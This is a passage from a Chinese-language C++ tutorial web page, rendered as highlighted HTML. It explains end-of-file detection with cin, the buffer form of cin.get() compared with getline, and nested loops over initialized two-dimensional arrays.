进行输出</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of input ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total characters read: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种 <code>get</code> 方法都可以用于逐字符读取，选择哪种取决于你喜欢的判断循环结束的方式（检查 <code>cin</code> 状态还是检查 <code>EOF</code> 返回值）。</p><h3 id="5-5-4-文件尾条件"><a href="#5-5-4-文件尾条件" class="headerlink" title="5.5.4 文件尾条件"></a>5.5.4 文件尾条件</h3><p>当从输入流（如 <code>cin</code> 或文件流）读取数据时，最终会到达输入的末尾，这被称为**文件尾 (End-of-File, EOF)**。程序需要能够检测到 EOF 条件以正常终止读取循环。</p><p>有几种方法可以检测 EOF：</p><ol><li><p><strong>检查 <code>cin</code> 状态:</strong></p><ul><li>  <code>cin</code> 对象本身可以转换为布尔值。当读取操作成功时，它转换为 <code>true</code>；当遇到 EOF 或其他错误导致读取失败时，它转换为 <code>false</code>。这是 <code>while (cin &gt;&gt; word)</code> 和 <code>while (cin.get(ch))</code> 能够工作的原因。</li><li>  <code>cin.eof()</code>: 如果流是因为到达文件末尾而失败，此函数返回 <code>true</code>。<strong>注意:</strong> <code>eof()</code> 只有在<strong>尝试读取并失败</strong>后才会变为 <code>true</code>。不能用它来预测下一次读取是否会到达 EOF。</li><li>  <code>cin.fail()</code>: 如果发生了非 EOF 的 I/O 错误（例如读取了无效数据类型）或到达 EOF，此函数返回 <code>true</code>。</li><li>  <code>cin.good()</code>: 如果流处于正常状态（没有设置 <code>eofbit</code>, <code>failbit</code>, <code>badbit</code>），返回 <code>true</code>。</li></ul></li><li><p><strong>检查 <code>cin.get()</code> 的返回值:</strong></p><ul><li>  无参数的 <code>cin.get()</code> 在到达 EOF 时返回特殊值 <code>EOF</code>。这是 <code>while ((ch = cin.get()) != EOF)</code> 能够工作的原因。</li></ul></li></ol><p><strong>EOF 的触发:</strong></p><ul><li><strong>键盘输入:</strong> 通常通过按下特定的组合键来模拟 EOF：<ul><li>  Unix/Linux/macOS: <code>Ctrl+D</code> (通常需要在行首按)</li><li>  Windows: <code>Ctrl+Z</code> (通常需要在一行结束后按 Enter，然后再按 <code>Ctrl+Z</code> 再按 Enter)</li></ul></li><li>  <strong>文件输入:</strong> 当读取操作尝试越过文件的最后一个字节时，会触发 EOF。</li></ul><p><strong>示例 (使用 <code>cin</code> 状态):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers (non-number or Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取，直到 cin 失败 (EOF 或类型不匹配)</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; number) &#123; </span><br><span class="line">        sum += number;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Input finished ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查循环结束的原因</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: End-of-File reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.fail()) &#123;</span><br><span class="line">        <span class="comment">// fail() 在 eof() 时也可能为 true，但这里我们排除了 eof</span></span><br><span class="line">        <span class="comment">// 如果是因为类型不匹配（例如输入了字母），fail() 为 true, eof() 为 false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Invalid input (non-number).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// 可能需要清除错误状态并忽略无效输入以继续</span></span><br><span class="line">        <span class="comment">// std::cin.clear(); </span></span><br><span class="line">        <span class="comment">// std::cin.ignore(10000, &#x27;\n&#x27;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.bad()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Unrecoverable stream error.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read &quot;</span> &lt;&lt; count &lt;&lt; <span class="string">&quot; numbers. Sum = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No valid numbers were entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解如何检测 EOF 对于编写能正确处理输入结束的循环至关重要。最常用的方法是利用 <code>cin</code> 对象或 <code>cin.get()</code> 在 <code>while</code> 条件中的行为。</p><h3 id="5-5-5-另一个cin-get-版本"><a href="#5-5-5-另一个cin-get-版本" class="headerlink" title="5.5.5 另一个cin.get()版本"></a>5.5.5 另一个cin.get()版本</h3><p>除了读取单个字符的 <code>get()</code> 函数外，<code>istream</code> 还提供了用于读取 C 风格字符串（字符数组）的 <code>get()</code> 版本：</p><ul><li><strong><code>cin.get(char* buffer, int size, char delimiter = &#39;\n&#39;)</code>:</strong><ul><li>  从输入流中读取字符，并将它们存储到 <code>buffer</code> 指向的字符数组中。</li><li>  最多读取 <code>size - 1</code> 个字符（为末尾的空字符 <code>\0</code> 留出空间）。</li><li>  如果在读取 <code>size - 1</code> 个字符之前遇到 <code>delimiter</code> 字符，则停止读取。</li><li>  <strong><code>delimiter</code> 字符本身不会被读取到 <code>buffer</code> 中，而是会留在输入流中。</strong> (这是与 <code>getline</code> 的主要区别之一)。</li><li>  读取结束后，总会在 <code>buffer</code> 的末尾添加一个空字符 <code>\0</code>。</li><li>  返回 <code>cin</code> 对象。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUFFER_SIZE = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[BUFFER_SIZE];</span><br><span class="line">    <span class="keyword">char</span> address[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your name (max &quot;</span> &lt;&lt; BUFFER_SIZE - <span class="number">1</span> &lt;&lt; <span class="string">&quot; chars): &quot;</span>;</span><br><span class="line">    <span class="comment">// 读取最多 BUFFER_SIZE - 1 个字符，或直到遇到换行符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(name, BUFFER_SIZE); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查读取是否成功以及是否还有剩余字符（换行符）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>) &#123; <span class="comment">// 检查流状态是否良好</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name entered: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 问题：换行符 &#x27;\n&#x27; 仍然留在输入流中！</span></span><br><span class="line">        <span class="comment">// 如果直接调用下一个 get 或 getline，它会立即读到换行符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理残留的换行符</span></span><br><span class="line">        <span class="comment">// 方法1: 读取并丢弃单个字符 (如果是换行符)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.peek() == <span class="string">&#x27;\n&#x27;</span>) &#123; <span class="comment">// peek() 查看下一个字符但不读取</span></span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(); <span class="comment">// 读取并丢弃一个字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 方法2: 读取并丢弃直到换行符 (更通用)</span></span><br><span class="line">        <span class="comment">// std::cin.ignore(10000, &#x27;\n&#x27;); </span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your address (max &quot;</span> &lt;&lt; BUFFER_SIZE - <span class="number">1</span> &lt;&lt; <span class="string">&quot; chars): &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>.get(address, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address entered: &quot;</span> &lt;&lt; address &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error reading address or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error reading name or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>与 <code>getline(cin, string)</code> 的比较:</strong></p><ul><li><code>cin.get(buffer, size)</code>:<ul><li>  用于 C 风格字符数组。</li><li>  需要指定缓冲区大小以防止溢出。</li><li>  <strong>不读取</strong>分隔符，分隔符留在流中。</li><li>  需要手动处理留在流中的分隔符。</li></ul></li><li><code>getline(cin, str)</code>:<ul><li>  用于 <code>std::string</code> 对象。</li><li>  自动管理内存，无需担心缓冲区溢出。</li><li>  <strong>读取并丢弃</strong>分隔符（默认为 <code>\n</code>）。</li><li>  通常更方便、更安全。</li></ul></li></ul><p>由于 <code>cin.get(buffer, size)</code> 不读取分隔符并将其留在流中，这常常导致后续输入出现问题。因此，在现代 C++ 中，当需要读取整行文本时，**强烈推荐使用 <code>getline(cin, std::string)</code>**。<code>cin.get(buffer, size)</code> 主要用于需要与 C 风格字符串 API 交互或有特定限制的场景。</p><h2 id="5-6-嵌套循环和二维数组"><a href="#5-6-嵌套循环和二维数组" class="headerlink" title="5.6 嵌套循环和二维数组"></a>5.6 嵌套循环和二维数组</h2><p><strong>嵌套循环 (Nested Loop)</strong> 是指一个循环结构完全包含在另一个循环结构的循环体内部。外层循环每执行一次，内层循环会完整地执行一遍（从开始到结束）。嵌套循环常用于处理具有多维结构的数据，例如表格、矩阵或图像的像素。</p><p><strong>二维数组 (Two-Dimensional Array)</strong> 是数组的一种扩展，可以看作是“数组的数组”。它在概念上像一个表格或网格，有行 (row) 和列 (column)。二维数组是使用嵌套循环处理的典型数据结构。</p><p><strong>嵌套循环示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> ROWS = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> COLS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Nested loop example (printing coordinates):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 外层循环控制行</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROWS; ++i) &#123; </span><br><span class="line">        <span class="comment">// 内层循环控制列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            <span class="comment">// 对于外层循环的每次迭代 (i)，内层循环会完整执行一遍 (j 从 0 到 COLS-1)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; j &lt;&lt; <span class="string">&quot;) &quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 每行结束后换行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nested loop example (printing coordinates):</span><br><span class="line">(0,0) (0,1) (0,2) (0,3) </span><br><span class="line">(1,0) (1,1) (1,2) (1,3) </span><br><span class="line">(2,0) (2,1) (2,2) (2,3) </span><br></pre></td></tr></table></figure><h3 id="5-6-1-初始化二维数组"><a href="#5-6-1-初始化二维数组" class="headerlink" title="5.6.1 初始化二维数组"></a>5.6.1 初始化二维数组</h3><p>声明二维数组需要指定两个维度的大小：第一个是<strong>行数</strong>，第二个是<strong>列数</strong>。</p><p><strong>声明语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[numberOfRows][numberOfColumns];</span><br></pre></td></tr></table></figure><p><strong>初始化方法:</strong></p><p>可以使用嵌套的花括号 <code>&#123;&#125;</code> 来初始化二维数组。外层花括号代表整个数组，内层花括号代表每一行。</p><ol><li><strong>完整初始化:</strong> 提供所有行的初始化列表。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> matrix[<span class="number">3</span>][<span class="number">4</span>] = &#123; <span class="comment">// 3 行 4 列</span></span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,    <span class="comment">// 初始化第 0 行</span></span><br><span class="line">    &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,    <span class="comment">// 初始化第 1 行</span></span><br><span class="line">    &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;  <span class="comment">// 初始化第 2 行</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>部分初始化:</strong> 如果提供的初始化值不足，剩余元素会被自动初始化为 0（对于数值类型）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> partial[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>&#125;,          <span class="comment">// 第 0 行: &#123;1, 2, 0, 0&#125;</span></span><br><span class="line">    &#123;<span class="number">5</span>&#125;              <span class="comment">// 第 1 行: &#123;5, 0, 0, 0&#125;</span></span><br><span class="line">                     <span class="comment">// 第 2 行: &#123;0, 0, 0, 0&#125; (未提供初始化列表)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将整个二维数组初始化为 0</span></span><br><span class="line"><span class="keyword">int</span> allZeros[<span class="number">10</span>][<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 或 C++11: int allZeros[10][20] &#123;&#125;;</span></span><br></pre></td></tr></table></figure></li><li><strong>省略行数 (但不能省略列数):</strong> 如果在声明时提供了初始化列表，可以省略第一个维度（行数），编译器会根据初始化列表推断行数。<strong>但第二个维度（列数）必须指定。</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> inferredRows[][<span class="number">4</span>] = &#123; <span class="comment">// 列数必须是 4</span></span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>&#125;</span><br><span class="line">&#125;; <span class="comment">// 编译器推断行数为 2</span></span><br></pre></td></tr></table></figure></li><li><strong>C++11 列表初始化:</strong> 可以省略等号 <code>=</code>。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> matrix_cpp11[<span class="number">2</span>][<span class="number">3</span>] &#123; &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">int</span> zeros_cpp11[<span class="number">5</span>][<span class="number">5</span>] &#123;&#125;; <span class="comment">// 所有元素初始化为 0</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 完整初始化</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">2</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 部分初始化</span></span><br><span class="line">    <span class="keyword">float</span> coords[<span class="number">3</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1.1f</span>, <span class="number">2.2f</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3.3f</span>&#125; <span class="comment">// &#123;3.3f, 0.0f&#125;</span></span><br><span class="line">        <span class="comment">// 第三行为 &#123;0.0f, 0.0f&#125;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略行数</span></span><br><span class="line">    <span class="keyword">char</span> messages[][<span class="number">10</span>] = &#123; <span class="comment">// 列数必须指定</span></span><br><span class="line">        <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">        <span class="string">&quot;World&quot;</span></span><br><span class="line">    &#125;; <span class="comment">// 推断为 2 行 10 列</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 初始化</span></span><br><span class="line">    <span class="keyword">int</span> table[<span class="number">2</span>][<span class="number">2</span>] &#123; &#123;<span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">4</span>&#125; &#125;; <span class="comment">// &#123;&#123;1, 0&#125;, &#123;3, 4&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;data[1][1]: &quot;</span> &lt;&lt; data[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 50</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;coords[1][1]: &quot;</span> &lt;&lt; coords[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;messages[0]: &quot;</span> &lt;&lt; messages[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;table[0][1]: &quot;</span> &lt;&lt; table[<span class="number">0</span>][<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-6-2-使用二维数组"><a href="#5-6-2-使用二维数组" class="headerlink" title="5.6.2 使用二维数组"></a>5.6.2 使用二维数组</h3><p>访问二维数组的元素需要提供两个索引：第一个是<strong>行索引</strong>，第二个是<strong>列索引</strong>。索引同样从 0 开始。</p><p><strong>访问语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayName[rowIndex][columnIndex]</span><br></pre></td></tr></table></figure><p><strong>使用嵌套循环处理二维数组:</strong></p><p>嵌套循环是处理二维数组所有元素的标准方法。通常，外层循环遍历行，内层循环遍历列。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_CITIES = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_MONTHS = <span class="number">4</span>; <span class="comment">// 假设只记录 4 个月的数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 存储 3 个城市 4 个月的平均气温</span></span><br><span class="line">    <span class="keyword">double</span> temperatures[NUM_CITIES][NUM_MONTHS] = &#123;</span><br><span class="line">        &#123;<span class="number">10.5</span>, <span class="number">12.1</span>, <span class="number">15.3</span>, <span class="number">18.0</span>&#125;, <span class="comment">// City 0</span></span><br><span class="line">        &#123;<span class="number">8.2</span>, <span class="number">9.5</span>, <span class="number">13.0</span>, <span class="number">16.5</span>&#125;,  <span class="comment">// City 1</span></span><br><span class="line">        &#123;<span class="number">12.0</span>, <span class="number">14.5</span>, <span class="number">17.8</span>, <span class="number">21.2</span>&#125;  <span class="comment">// City 2</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Monthly average temperatures:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span 